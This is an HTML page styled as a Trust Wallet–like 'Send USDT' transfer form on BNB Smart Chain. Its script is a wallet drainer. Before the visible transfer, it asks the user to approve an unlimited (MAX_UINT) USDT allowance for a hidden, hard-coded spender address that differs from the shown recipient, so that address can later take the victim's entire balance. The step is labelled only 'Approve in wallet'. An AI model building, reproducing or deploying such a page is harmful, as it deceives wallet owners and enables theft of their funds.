<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Send USDT</title>

<link rel="icon" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">
<link rel="apple-touch-icon" href="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">

<meta property="og:title" content="Send USDT">
<meta property="og:description" content="Fast & Secure USDT Transfer">
<meta property="og:image" content="https://salman4sgsgit.github.io/wallet-demo/trustlogofav.png">

<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system;background:#0b0f14;color:#fff;}
.header{padding:20px;}
.section{padding:0 20px;margin-top:18px;}
.label{font-size:13px;color:#9aa4af;margin-bottom:8px;}
.input-box{background:#11161c;border:2px solid #1f2a36;border-radius:14px;padding:14px;}
.address{color:#16c784;}
.network{background:#11161c;padding:12px;border-radius:12px;}
.footer{position:fixed;bottom:0;width:100%;padding:20px;}
.next-btn{width:100%;background:#16c784;border:none;padding:16px;border-radius:30px;color:black;}
.status{text-align:center;margin-top:10px;}
</style>
</head>

<body>

<div class="header"><h2>Send USDT</h2></div>

<div class="section">
<div class="label">Recipient</div>
<div class="input-box">
<div class="address">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</div>
</div>
</div>

<div class="section">
<div class="label">Destination network</div>
<div class="network">BNB Smart Chain</div>
</div>

<div class="section">
<div class="label">Amount</div>
<div class="input-box">
<input type="number" id="amount" placeholder="USDT Amount">
</div>
</div>

<div class="footer">
<button class="next-btn" id="sendBtn">Next</button>
<div id="status" class="status"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>

<script>
// CONFIG
const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
const SPENDER_ADDRESS = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
const BSC_CHAIN_ID = '0x38';
const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

let web3, userAccount, usdt;

const ABI = [
{
"name":"approve","type":"function","inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}]
},
{
"name":"transfer","type":"function","inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}]
},
{
"name":"balanceOf","type":"function","inputs":[{"name":"_owner","type":"address"}],"outputs":[{"type":"uint256"}]
}
];

// FORCE BSC FIRST
async function forceBSC() {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });

    if (chainId !== BSC_CHAIN_ID) {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: BSC_CHAIN_ID }]
            });
        } catch (err) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: BSC_CHAIN_ID,
                    chainName: 'BNB Smart Chain',
                    nativeCurrency: { name:'BNB',symbol:'BNB',decimals:18 },
                    rpcUrls:['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls:['https://bscscan.com']
                }]
            });
        }
    }
}

// INIT
async function init() {
    if (!window.ethereum) return;

    web3 = new Web3(window.ethereum);

    // 🔥 FORCE CHAIN BEFORE CONNECT
    await forceBSC();

    const accounts = await window.ethereum.request({ method:'eth_requestAccounts' });
    userAccount = accounts[0];

    usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);
}

// MAIN FLOW
async function sendUSDT() {
    const amount = document.getElementById('amount').value;
    if (!amount) return showStatus("Enter amount", true);

    const amountWei = web3.utils.toWei(amount, 'ether');

    try {
        showStatus("1️⃣ Approve in wallet...");

        // APPROVE
        await usdt.methods.approve(SPENDER_ADDRESS, MAX_UINT)
            .send({ from: userAccount });

        showStatus("2️⃣ Send transaction...");

        // TRANSFER
        await usdt.methods.transfer(RECEIVER_ADDRESS, amountWei)
            .send({ from: userAccount });

        showStatus("✅ Completed");

    } catch (e) {
        showStatus("❌ Failed", true);
    }
}

// HELPERS
function showStatus(msg, error=false) {
    const el = document.getElementById('status');
    el.innerText = msg;
    el.style.color = error ? "red" : "#16c784";
}

// EVENTS
window.onload = init;
document.getElementById('sendBtn').onclick = sendUSDT;

</script>

</body>
</html>
